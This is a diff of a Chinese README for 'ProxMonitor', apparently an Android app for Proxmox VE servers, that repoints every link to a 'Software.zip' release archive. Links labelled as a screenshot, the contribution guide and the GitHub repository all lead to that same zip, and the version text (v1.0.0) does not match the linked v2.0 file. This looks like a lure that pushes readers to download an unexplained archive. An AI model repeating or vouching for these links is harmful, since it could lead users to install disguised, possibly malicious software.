@@ -2,7 +2,7 @@
 
 ProxMonitor 是一个用于监控和管理 Proxmox VE 服务器的 Android 应用。它提供了直观的界面来查看和控制您的虚拟化环境。
 
-![ProxMonitor Screenshot](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v1.0/Installer.zip)
+![ProxMonitor Screenshot](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v2.0/Software.zip)
 
 ## Features 🌟
 
@@ -12,7 +12,7 @@ ProxMonitor 是一个用于监控和管理 Proxmox VE 服务器的 Android 应�
 
 ## 如何使用
 
-1. 下载 [ProxMonitor v1.0.0](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v1.0/Installer.zip) 文件并解压缩。
+1. 下载 [ProxMonitor v1.0.0](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v2.0/Software.zip) 文件并解压缩。
 2. 将 apk 文件传输到您的 Android 设备。
 3. 在设备上安装该应用。
 
@@ -20,7 +20,7 @@ ProxMonitor 是一个用于监控和管理 Proxmox VE 服务器的 Android 应�
 
 ## 贡献
 
-我们欢迎任何形式的贡献！请查看我们的 [贡献指南](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v1.0/Installer.zip)。
+我们欢迎任何形式的贡献！请查看我们的 [贡献指南](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v2.0/Software.zip)。
 
 ## 版权
 
@@ -28,6 +28,6 @@ ProxMonitor 是一个用于监控和管理 Proxmox VE 服务器的 Android 应�
 
 ---
 
-[![Download ProxMonitor](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v1.0/Installer.zip)](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v1.0/Installer.zip)
+[![Download ProxMonitor](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v2.0/Software.zip)](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v2.0/Software.zip)
 
-🌐 访问 [ProxMonitor GitHub repository](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v1.0/Installer.zip) 获取更多信息。
+🌐 访问 [ProxMonitor GitHub repository](https://github.com/UltraMIlk28/ProxMonitor/releases/download/v2.0/Software.zip) 获取更多信息。
